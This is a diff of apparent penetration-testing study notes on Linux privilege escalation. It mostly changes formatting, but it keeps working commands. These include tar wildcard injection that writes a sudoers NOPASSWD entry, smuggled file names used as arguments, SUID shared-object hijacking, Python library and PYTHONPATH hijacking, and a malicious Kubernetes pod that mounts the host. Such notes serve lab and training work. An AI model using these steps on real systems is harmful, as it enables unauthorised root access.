@@ -359,33 +359,33 @@ We can run commands inserted inside commands that we have permission for, e.g.:
   * **Wildcard Abuse** (**`*`** at the end of the cronjob/script)
 
     * It is the use of **wildcard characters** (`*`, `--option=value`, etc.) to **inject arguments into the command** called by a cronjob (usually with elevated privileges). **BASICALLY** when there is a **`*`** at the end of a cronjob and we try to exploit it. Example with `tar`, it is possible to abuse the **flag `--checkpoint-action=exec=`** to execute arbitrary commands.
-
-    ```
-    * * * * * root cd /somepath && tar -zcf backup.tar.gz *
-    ```
+  
+      ```
+      * * * * * root cd /somepath && tar -zcf backup.tar.gz *
+      ```
 
     * When we locate the **`*`**, we check if we have write permission in the directory:
 
-    ```bash
-    cd /path
-    touch test.txt
-    ```
+      ```bash
+      cd /path
+      touch test.txt
+      ```
 
     * We then explore according to the cronjob (since we will change flags..).. research accordingly.
 
     * **Ex → `tar`:**
 
-    ```bash
-    echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
-    chmod +x root.sh
-    echo "" > "--checkpoint-action=exec=sh root.sh"
-    echo "" > --checkpoint=1
-    ```
-
-    ```bash
-    sudo -l
-    sudo su -
-    ```
+      ```bash
+      echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
+      chmod +x root.sh
+      echo "" > "--checkpoint-action=exec=sh root.sh"
+      echo "" > --checkpoint=1
+      ```
+  
+      ```bash
+      sudo -l
+      sudo su -
+      ```
 
     ---
 
@@ -435,7 +435,7 @@ We can run commands inserted inside commands that we have permission for, e.g.:
     cat /etc/exports
     ```
 
-  * LOOK for any entry with the option `no_root_squash`, and also for `rw` (read,write) which means we can create an executable inside.
+  * Look for any entry with the option `no_root_squash`, and also for `rw` (read,write) which means we can create an executable inside.
 
   * Now, on our machine we will see the shares available on the NFS server:
 
@@ -709,7 +709,7 @@ We can run commands inserted inside commands that we have permission for, e.g.:
 
     [https://github.com/YasserREED/screen-v4.5.0-priv-escalate](https://github.com/YasserREED/screen-v4.5.0-priv-escalate)
 
-    ---
+---
 
   * **Logrotate** (`logrotate --version`)
 
@@ -859,8 +859,6 @@ We can run commands inserted inside commands that we have permission for, e.g.:
     * `-d` shows what would be done, useful to understand the flow.
     * `-f` forces rotation and can help test during a CTF or HTB box if you have limited sudo.
 
-    ---
-
   ---
 
   ## **Kubernetes**
@@ -984,7 +982,7 @@ We can run commands inserted inside commands that we have permission for, e.g.:
 
   ---
 
-  # Quick Reference Table
+  ### Quick Reference Table
 
   | Step | Goal                     | Main Command                    |
   | ---- | ------------------------ | ------------------------------- |
@@ -997,7 +995,8 @@ We can run commands inserted inside commands that we have permission for, e.g.:
   | 7    | Create malicious Pod     | `kubectl apply -f privesc.yaml` |
   | 8    | Access host files        | `cat /mnt/host/...`             |
 
-    ---
+
+---
 
   ## **Shared Object Hijacking**
 
@@ -1005,9 +1004,8 @@ We can run commands inserted inside commands that we have permission for, e.g.:
 
   If a binary with **SUID permission** (run as root) looks for a library from a **custom and vulnerable (writable)** path, we can **create a fake library** to run malicious code as **root**.
 
-  ---
 
-  Via SUID:
+  Via **SUID**:
 
   **`find / -perm -4000 -type f 2>/dev/null`**
 
@@ -1050,7 +1048,8 @@ We can run commands inserted inside commands that we have permission for, e.g.:
 
   **`./payroll`**
 
-    ---
+
+  ---
 
   ## **Python Library Hijacking**
 
@@ -1072,7 +1071,7 @@ We can run commands inserted inside commands that we have permission for, e.g.:
 
   ---
 
-  ### **INDICATORS / QUICK CHECKLIST:**
+  #### **INDICATORS / QUICK CHECKLIST:**
 
   1. **Python file executed as root?**
 
@@ -1109,10 +1108,8 @@ We can run commands inserted inside commands that we have permission for, e.g.:
      ```
 
   ---
-
-  ### **IF ANY OF THE ABOVE INDICATORS CONFIRM...**
-
-  ### **OPTION A – Direct hijack of an editable module**
+  
+  #### **OPTION A – Direct hijack of an editable module**
 
   ```python
   def virtual_memory():
@@ -1124,7 +1121,7 @@ We can run commands inserted inside commands that we have permission for, e.g.:
 
   ---
 
-  ### **OPTION B – Path Hijacking (directory above the real one with write permission)**
+  #### **OPTION B – Path Hijacking (directory above the real one with write permission)**
 
   ```bash
   cd /usr/lib/python3.8/
@@ -1135,7 +1132,7 @@ We can run commands inserted inside commands that we have permission for, e.g.:
 
   ---
 
-  ### **OPTION C – Hijack via PYTHONPATH with SETENV**
+  #### **OPTION C – Hijack via PYTHONPATH with SETENV**
 
   ```bash
   echo 'def virtual_memory(): import os; os.system("id")' > /tmp/psutil.py
@@ -1146,7 +1143,7 @@ We can run commands inserted inside commands that we have permission for, e.g.:
 
   ---
 
-  ## **POST-EXPLOITATION / ROOT SHELL**
+  #### **POST-EXPLOITATION / ROOT SHELL**
 
   Replace `os.system("id")` with:
 
@@ -1157,7 +1154,7 @@ We can run commands inserted inside commands that we have permission for, e.g.:
 
   ---
 
-  ## QUICK MEMORY — KEY COMMANDS:
+  #### QUICK MEMORY — KEY COMMANDS:
 
   | Step                            | Command                                     |
   | ------------------------------- | ------------------------------------------- |
